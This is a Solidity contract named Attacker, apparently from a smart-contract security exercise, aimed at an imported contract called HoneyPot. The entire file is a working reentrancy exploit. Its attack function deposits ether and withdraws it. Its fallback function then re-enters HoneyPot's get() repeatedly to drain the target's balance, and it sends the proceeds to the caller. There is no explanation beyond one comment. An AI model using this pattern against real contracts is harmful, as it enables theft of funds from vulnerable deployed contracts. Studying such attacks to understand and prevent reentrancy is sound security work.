pragma solidity 0.5.0;

import "./HoneyPot.sol";

contract Attacker {
    function attack(address honeyPot) payable public {
        uint before = address(this).balance;
        HoneyPot(honeyPot).put.value(msg.value)();
        HoneyPot(honeyPot).get();
        require(address(this).balance > before);
        msg.sender.transfer(address(this).balance);
    }

    function() payable external {
        assembly {
            // The cheapest logging I could think of.
            log0(0, 0)
        }
        if (msg.sender.balance >= msg.value && gasleft() >= 20000) {
            HoneyPot(msg.sender).get();
        }
    }
}